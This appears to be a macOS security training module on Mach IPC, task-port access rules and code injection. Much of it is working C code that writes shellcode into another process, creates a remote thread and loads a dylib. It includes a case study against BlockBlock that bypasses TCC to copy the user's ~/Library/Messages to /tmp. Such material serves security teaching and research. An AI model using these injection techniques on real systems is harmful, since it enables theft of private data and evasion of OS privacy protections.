# Module 5: Mach IPC and Code Injection

## Mach IPC Concepts

Mach is the microkernel at the core of XNU. It manages scheduling, threads, hardware, virtual memory, and **message passing between tasks**.

### Tasks, Threads, and Ports

- **Mach task** = smallest unit to share resources; maps 1:1 to POSIX processes
- **Mach thread** = maps to POSIX thread
- **Port** = kernel-managed message queue accepting structured Mach messages
- **Mach message** = fixed header (`mach_msg_header_t`) + custom body

### Port Rights

| Right | Description |
|-------|-------------|
| **RECEIVE** | Dequeue messages; only ONE task per port can hold this |
| **SEND** | Send multiple messages to port; can be cloned and transferred |
| **SEND_ONCE** | Send a single message to port |

SEND rights are initially owned by the RECEIVE holder. Transfer via Mach messages enables IPC.

### Bootstrap Server (launchd)

- PID 1, first process on system; every task has a SEND right to it
- Service registration: task creates port + RECEIVE right, creates SEND right, registers service name with launchd
- Service lookup: another task asks launchd for service name, gets a copy of SEND right
- **Security issue**: launchd cannot verify service name ownership; Apple stores system services in SIP-protected plists at `/System/Library/LaunchDaemons` and `/System/Library/LaunchAgents`

### IPC Flow (Custom Services)

```
1. Task A: mach_port_allocate() -> RECEIVE right
2. Task A: mach_port_insert_right() -> SEND right
3. Task A: bootstrap_register(bootstrap_port, "service.name", port)
4. Task B: bootstrap_look_up(bootstrap_port, "service.name", &port) -> gets SEND right
5. Task B: mach_msg() -> sends message to Task A
```

### Key API Calls

```c
mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
bootstrap_register(bootstrap_port, "org.example.service", port);  // deprecated
bootstrap_look_up(bootstrap_port, "org.example.service", &port);
mach_msg(&message.header, MACH_RCV_MSG, 0, sizeof(message), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
```

## Mach Special Ports

| Port | Description |
|------|-------------|
| **HOST_PORT** | System info queries (e.g., `host_processor_info`) |
| **HOST_PRIV_PORT** | Privileged actions (e.g., `kext_request`); requires root + entitlements |
| **Task Port** | Full control over a task: read/write memory, create/stop threads |

### Task Port Access Control (AMFI `macos_task_policy`)

1. **`com.apple.security.get-task-allow`** entitlement: any same-user process can access task port (dangerous; used for debug builds; rejected by notarization)
2. **`com.apple.system-task-ports`** entitlement: access any task port except kernel (Apple-only)
3. **Not Apple platform binary + not hardened runtime**: root can get task port

## Injection via Mach Task Ports

### Step 1: Get SEND Right with task_for_pid

```c
kern_return_t task_for_pid(mach_port_name_t target_tport, int pid, mach_port_name_t *t);

pid_t pid = 2222;
task_t remoteTask;
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) { /* target not injectable */ }
```

### Step 2: Allocate + Write Remote Memory

```c
// Allocate stack and code regions
mach_vm_address_t remoteStack64 = (vm_address_t)NULL;
mach_vm_address_t remoteCode64 = (vm_address_t)NULL;

kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
kr = mach_vm_allocate(remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE);

// Write shellcode
kr = mach_vm_write(remoteTask, remoteCode64, (vm_address_t)shellcode, CODE_SIZE);

// Set permissions
kr = vm_protect(remoteTask, remoteCode64, CODE_SIZE, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
```

### Step 3: Set Thread State and Create Remote Thread

```c
x86_thread_state64_t remoteThreadState64;
memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));
remoteStack64 += (STACK_SIZE / 2);
remoteThreadState64.__rip = (u_int64_t)remoteCode64;
remoteThreadState64.__rsp = (u_int64_t)remoteStack64;
remoteThreadState64.__rbp = (u_int64_t)remoteStack64;

thread_act_t remoteThread;
kr = thread_create_running(remoteTask, x86_THREAD_STATE64,
    (thread_state_t)&remoteThreadState64, x86_THREAD_STATE64_COUNT, &remoteThread);
```

## BlockBlock Case Study

**Target**: BlockBlock v0.9.9.4 - distributed with `com.apple.security.get-task-allow` = true, had Full Disk Access TCC rights.

**Goal**: Inject shellcode to copy `~/Library/Messages/` to `/tmp/Messages/` (bypassing TCC).

### Finding the PID Programmatically

```objc
NSArray *apps = [NSRunningApplication
    runningApplicationsWithBundleIdentifier:@"com.objectiveSee.BlockBlock"];
// Iterate, find non-root instance using sysctl with MIB {CTL_KERN, KERN_PROC, KERN_PROC_PID, pid}
// Read process.kp_eproc.e_ucred.cr_uid for effective UID
```

### Compile and Run

```bash
gcc -framework Foundation -framework Appkit bb.m -o bb
./bb
# [+] Got access to the task port of process: 21054
# [+] Exploit succeeded! Check /tmp/
ls -l /tmp/Messages   # copied from ~/Library/Messages/
```

## Injecting a Dylib via Mach

### Problem: Mach Threads vs POSIX Threads

Mach threads lack pthread structure; complex function calls (beyond simple syscalls) require a valid pthread.

### Solution: `pthread_create_from_mach_thread`

```c
int pthread_create_from_mach_thread(pthread_t *thread, const pthread_attr_t *attr,
    void *(*start_routine)(void *), void *arg);
```

Creates a proper pthread from an injected Mach thread (available since macOS 10.12).

### The dlopen Shellcode (Two-Stage)

**Stage 1 (Mach thread bootstrap)**:
- Set up args for `pthread_create_from_mach_thread`
- Call it with pointer to Stage 2 as start routine
- Enter infinite loop (`jmp $`) to keep Mach thread alive

**Stage 2 (New pthread)**:
- Call `dlopen(path_to_dylib, RTLD_LAZY)` to load arbitrary dylib

### Patching Placeholders at Runtime

```c
char *lib = "/tmp/bb.dylib";
uint64_t addr_pthread = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_create_from_mach_thread");
uint64_t addr_dlopen = (uint64_t)dlopen;

// Scan shellcode for placeholder strings and patch:
// "PTHRDCRT" -> addr_pthread
// "DLOPEN__" -> addr_dlopen
// "LIBLIBLIB" -> lib path string
```

### Injected Dylib Example

```c
#include <stdlib.h>
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
    system("cp -r ~/Library/Messages/ /tmp/Messages/");
    exit(0);
}
```

### Compile and Execute

```bash
gcc -dynamiclib toinject.c -o /tmp/bb.dylib
gcc -framework Foundation -framework Appkit bbdylib.m -o bbdylib
./bbdylib
# [+] Exploit succeeded! Check /tmp/
```
